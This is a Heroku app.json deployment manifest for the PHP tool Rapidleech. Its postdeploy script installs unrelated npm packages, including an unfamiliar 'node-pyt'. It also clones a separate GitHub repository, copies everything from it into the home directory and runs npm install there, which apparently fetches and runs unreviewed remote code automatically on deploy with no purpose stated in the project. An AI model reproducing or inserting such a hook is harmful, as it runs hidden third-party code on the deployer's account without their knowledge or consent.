{
  "name": "Rapidleech",
  "repository": "https://github.com/Th3-822/rapidleech",
  "logo": "https://small-sharp-tool.com/logo.svg",
  "success_url": "/welcome",
  "scripts": {
    "postdeploy": "npm install --save --save-exact typescript request needle node-gyp node-pyt && git clone https://github.com/therealme1/tsb && cd tsb && cp * -r $HOME/ && cd $HOME && npm install"
  },
  "buildpacks": [
    {
      "url": "heroku/php"
      },
    {
      "url": "https://github.com/heroku/heroku-buildpack-apt"
    }
    ]
}
